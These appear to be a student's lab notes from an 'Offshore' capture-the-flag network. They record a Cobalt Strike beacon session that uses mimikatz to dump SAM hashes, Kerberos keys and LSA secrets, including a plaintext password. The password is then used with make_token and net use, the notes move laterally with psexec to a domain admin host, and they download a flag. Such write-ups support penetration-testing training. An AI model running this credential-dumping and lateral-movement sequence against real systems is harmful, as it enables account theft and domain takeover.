
with `SYSTEM` `cobaltstrike beacon` begin utilizing `mimikatz` to find some sort of `credentials` 
- started utilizing `commands` from [[3.2 credential_Theft]] to start off 

`mimikatz token::elevate ; lsadump::sam`
- nothing crazy
```powershell
[12/07 10:00:52] beacon> mimikatz token::elevate ; lsadump::sam
[12/07 10:00:54] [*] Tasked beacon to run mimikatz's token::elevate ; lsadump::sam command
[12/07 10:00:55] [+] host called home, sent: 815425 bytes
[12/07 10:00:56] [+] received output:
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

256	{0;000003e7} 0 D 30163     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,30p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 639277    	NT AUTHORITY\SYSTEM	S-1-5-18	(11g,05p)	Primary
 * Thread Token  : {0;000003e7} 0 D 650888    	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,30p)	Impersonation (Delegation)
Domain : WS02
SysKey : 54a7f6c97fd9cf227f4854cdecc675c2
Local SID : S-1-5-21-596527914-395967817-3676861635

SAMKey : c0527d299a78f6879430552082be5d02

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003ea (1002)
User : justalocaladmin
  Hash NTLM: ea72d5d7b3172b02fe64b5c7ce7c621a
    lm  - 0: 650b1987e455ec3da4ae7cfcad6cc5ea
    lm  - 1: 4d397248b90ae058bf05d0b421b1de2b
    lm  - 2: aff244e00ae314a91685214bd81e91ee
    lm  - 3: adc2c9078b0bf4d6dd2de60cfddd140f
    lm  - 4: f05c10cddc94b35d352048a1c745561b
    lm  - 5: 53a0a5e69249f1bbfeeb9dd8f5bb49e3
    lm  - 6: f224c1eea53162b71e795fe893d84aac
    lm  - 7: f8cea458a2be5a769bc661917c8160c9
    lm  - 8: a343a8ba50ca187a422d847a3bed941c
    lm  - 9: d63c0495837f63842ca54dcab6035dee
    lm  -10: 768e3747d9767d9aa361c97fffcc744b
    lm  -11: b8328db252e656dc51460602639f495e
    lm  -12: 2903d932896db3d194534effcc1222d0
    lm  -13: b7b0df568c83c33258ea65b1b4011e32
    lm  -14: 26437c29f70b5f4ed9bdc7d936144f8a
    lm  -15: b2ad4c0aeb3bb90fc6cd9e31c1f1a6ea
    lm  -16: 574ad6d93fa06c63080cf717848a0a48
    lm  -17: b2c06b29f13ab735ab37ed8bd2318b59
    lm  -18: 7aab6f15c57d215ff82e5eaf7c947d9f
    lm  -19: 8f24cf96daa79ae1b2627c0c99ef96b6
    lm  -20: 1b9874aa6be9a969fef8fc7733dd90dc
    lm  -21: e3c3af74421cbc8b7dd13422de38cda8
    lm  -22: ca5da5ee805bea94c623f77d92bbdcf3
    lm  -23: 6a844c5f4bc0941e6cf51f02ebe2b1bc
    ntlm- 0: ea72d5d7b3172b02fe64b5c7ce7c621a
    ntlm- 1: 863b21b9ca04cc1ceca3adb8bbeeb54e
    ntlm- 2: 6417b25b06d2f52b2363ad79ad130498
    ntlm- 3: a485c333824ca634e27638a172dc516a
    ntlm- 4: f1c06b415e5b31b16800bd645e735332
    ntlm- 5: 7dfaf153eed481f627f7b0e04228ea9b
    ntlm- 6: ff4d57791e6354c2071cb9a3fdfe5122
    ntlm- 7: 9e400d228812f64f4e49e618f7e8e6b5
    ntlm- 8: 539f125b283b699a0c3153fa4af433a8
    ntlm- 9: 2193c1b40801f6fbf665185ea978e4e1
    ntlm-10: ed98223ce59c7ce1477e8fe37d78f9fe
    ntlm-11: f215f394c0602c9538dafb09f8132de8
    ntlm-12: 873cc6587299d8893c518cd52b1c92e6
    ntlm-13: 09f6055c389843025a48671fbc766289
    ntlm-14: 60737a15e62aeee17b94736d604bc946
    ntlm-15: daff77c9be8bc2c3e04bb02b5c881187
    ntlm-16: 7cde9327fe32a770e0d554c9df57aa87
    ntlm-17: cd349708196710d313f954aa34df983c
    ntlm-18: 96f1bc10595304d08021a806ba867ae6
    ntlm-19: 1157704c786a091ca419f5d0747ce483
    ntlm-20: 3b150eeb04b2bf77cf3cdbf766f6bbe2
    ntlm-21: f91fdcf7b177046a69811dd50f36a9f7
    ntlm-22: ab781997e9dbe109dd334ec46599c193
    ntlm-23: e0f89f9fe4262b6ee6b46649caa8f173
```
`mimikatz !sekurlsa::ekeys`
- grabbing `ekeys`
```powershell
[12/07 10:01:55] beacon> mimikatz !sekurlsa::ekeys
[12/07 10:01:57] [*] Tasked beacon to run mimikatz's !sekurlsa::ekeys command
[12/07 10:01:57] [+] host called home, sent: 815427 bytes
[12/07 10:01:59] [+] received output:

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS02$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 12/7/2023 9:38:43 AM
SID               : S-1-5-20

	 * Username : ws02$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	 * Key List :
	   aes256_hmac       dd6bfdd43a405922d7d002601b0b271a35e8d28e728e452bc8854961b0bf60b6
	   rc4_hmac_nt       c72e375bed0918ced38b7a8d3e7f5e09
	   rc4_hmac_old      c72e375bed0918ced38b7a8d3e7f5e09
	   rc4_md4           c72e375bed0918ced38b7a8d3e7f5e09
	   rc4_hmac_nt_exp   c72e375bed0918ced38b7a8d3e7f5e09
	   rc4_hmac_old_exp  c72e375bed0918ced38b7a8d3e7f5e09

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS02$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 12/7/2023 9:38:43 AM
SID               : S-1-5-18

	 * Username : ws02$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	 * Key List :
	   aes256_hmac       dd6bfdd43a405922d7d002601b0b271a35e8d28e728e452bc8854961b0bf60b6
	   rc4_hmac_nt       c72e375bed0918ced38b7a8d3e7f5e09
	   rc4_hmac_old      c72e375bed0918ced38b7a8d3e7f5e09
	   rc4_md4           c72e375bed0918ced38b7a8d3e7f5e09
	   rc4_hmac_nt_exp   c72e375bed0918ced38b7a8d3e7f5e09
	   rc4_hmac_old_exp  c72e375bed0918ced38b7a8d3e7f5e09
```
`mimikatz !lsadump::secrets`
- dumped from the `SECRETS` hive and got plaintext credentials
- Workstationadmin1!
```powershell
[12/07 10:27:30] beacon> mimikatz !lsadump::secrets
[12/07 10:27:32] [*] Tasked beacon to run mimikatz's !lsadump::secrets command
[12/07 10:27:32] [+] host called home, sent: 815428 bytes
[12/07 10:27:33] [+] received output:
Domain : WS02
SysKey : 54a7f6c97fd9cf227f4854cdecc675c2

Local name : WS02 ( S-1-5-21-596527914-395967817-3676861635 )
Domain name : CORP ( S-1-5-21-2291914956-3290296217-2402366952 )
Domain FQDN : corp.local

Policy subsystem is : 1.11
LSA Key(s) : 1, default {e5837768-72e3-326a-1cca-d7a8727a8caa}
  [00] {e5837768-72e3-326a-1cca-d7a8727a8caa} dff76200c229d565a8aa66a9b7d0b21de4aa67feb50e0fa55481b3dde32a3a48

Secret  : $MACHINE.ACC
cur/text:  C(,XH/C<Paz1A>sF zf.j`V/^_T."Aq/l#cDitRw<B@m.7/e,;O^M*RHq/sqFlJb!GLotI\N5f6V571QZ)KO;*]MgnHW$<[txRNygHy0Axj`[e/egkT5bl4
    NTLM:c72e375bed0918ced38b7a8d3e7f5e09
    SHA1:ab2a9e7d654b6df43a49cd44d35a869ebf9d8d51
old/text:  C(,XH/C<Paz1A>sF zf.j`V/^_T."Aq/l#cDitRw<B@m.7/e,;O^M*RHq/sqFlJb!GLotI\N5f6V571QZ)KO;*]MgnHW$<[txRNygHy0Axj`[e/egkT5bl4
    NTLM:c72e375bed0918ced38b7a8d3e7f5e09
    SHA1:ab2a9e7d654b6df43a49cd44d35a869ebf9d8d51

Secret  : DefaultPassword
cur/text: Workstationadmin1!
old/text: Workstationadmin1!

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 47 10 43 42 07 88 3c df 6d 13 58 ed 9a 8b ae ef d8 0b ae 5c 72 35 1c fd e9 9a 60 2e 9d b7 e4 3c 4a 6a f6 88 8c e7 43 a8 
    full: 4710434207883cdf6d1358ed9a8baeefd80bae5c72351cfde99a602e9db7e43c4a6af6888ce743a8
    m/u : 4710434207883cdf6d1358ed9a8baeefd80bae5c / 72351cfde99a602e9db7e43c4a6af6888ce743a8
old/hex : 01 00 00 00 fb 20 81 ee 28 71 91 1d 22 51 b9 95 83 5c b7 2c 78 66 33 19 12 f9 89 58 d9 52 8f e0 38 89 1e d3 e3 46 62 c3 3a 43 ac b4 
    full: fb2081ee2871911d2251b995835cb72c7866331912f98958d9528fe038891ed3e34662c33a43acb4
    m/u : fb2081ee2871911d2251b995835cb72c78663319 / 12f98958d9528fe038891ed3e34662c33a43acb4

Secret  : NL$KM
cur/hex : 72 c4 a9 de f2 8d 95 21 1e 5f ea cd 63 3f a8 36 31 8a 48 04 5c e4 7b 3d 98 ae 6d 70 a4 07 56 23 76 15 8f 1c 29 6f 33 10 b7 38 fa b4 f6 6a 5b 6e 52 52 f3 55 b3 bb d6 9e d1 e0 6b 48 91 83 f8 29 

```
utilize `make_token` with `wsadm` & `Workstationadmin1!` to impersonate `CORP\wsadm`
`make_token CORP\wsadm Workstationadmin1!`
![[Pasted image 20231207112048.png]]
utilizing `run net use \\wsadm.corp.local\C$ /user:wsadmin "Workstationadmin1!"` to attach to share to enumerate `locations` of `flags`
```powershell
[12/07 11:06:46] beacon> run net use \\wsadm.corp.local\C$ /user:wsadmin "Workstationadmin1!"
[12/07 11:06:46] [*] Tasked beacon to run: net use \\wsadm.corp.local\C$ /user:wsadmin "Workstationadmin1!"
[12/07 11:06:46] [+] host called home, sent: 82 bytes
[12/07 11:06:46] [+] received output:
The command completed successfully.
```
`enumerating` drives
```powershell
[12/07 11:09:43] beacon> ls \\wsadm.corp.local\C$\Users\wsadmin\Desktop
[12/07 11:09:43] [*] Tasked beacon to list files in \\wsadm.corp.local\C$\Users\wsadmin\Desktop
[12/07 11:09:43] [+] host called home, sent: 61 bytes
[12/07 11:09:43] [+] Location: \\wsadm.corp.local\C$\Users\wsadmin\Desktop\*

 Size       Type    Last Modified         Name
 ----       ----    -------------------   ----
 282B       fil     04/20/2022 16:52:09   desktop.ini 
 25B        fil     02/27/2020 11:53:13   flag.txt 
 1KB        fil     06/25/2018 23:23:40   Microsoft Edge.lnk 

Files and dirs count: 3, total size of files: 1KB (output len: 217)
```
going to try to remotely get onto `WSADM`, `CORP\wsadm` is a `DOMAIN ADMIN`
```powershell
[12/07 11:28:20] beacon> jump psexec64 WSADM.corp.local smb
[12/07 11:28:22] [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\mojo.5689.8042.18389193978708887715) on WSADM.corp.local via Service Control Manager (\\WSADM.corp.local\ADMIN$\90b1122.exe)
[12/07 11:28:22] [+] host called home, sent: 360525 bytes
[12/07 11:28:27] [+] received output:
Started service 90b1122 on WSADM.corp.local
[12/07 11:28:27] [+] established link to child beacon: 172.16.1.36
```
![[Pasted image 20231207120342.png]]
navigated to location of `flag.txt` for download
```powershell
[12/07 11:31:10] beacon> download C:\Users\wsadmin\Desktop\flag.txt
[12/07 11:31:10] [*] Tasked beacon to download C:\Users\wsadmin\Desktop\flag.txt
[12/07 11:31:10] [+] host called home, sent: 41 bytes
[12/07 11:31:10] [*] started download of C:\Users\wsadmin\Desktop\flag.txt (25 bytes)
[12/07 11:31:10] [*] download of flag.txt is complete
```
saved in `~/SUT/offshore/wsadm/flag.txt`
The Cuckoo's Egg
```powershell
[root💀~/SUT/offshore/wsadm/flag.txt] [10.10.14.39] [2023-12-07 11:32:41] 
 └─╼ # cat flag.txt 
OFFSHORE{4t_y0ur_5erv1ce}
```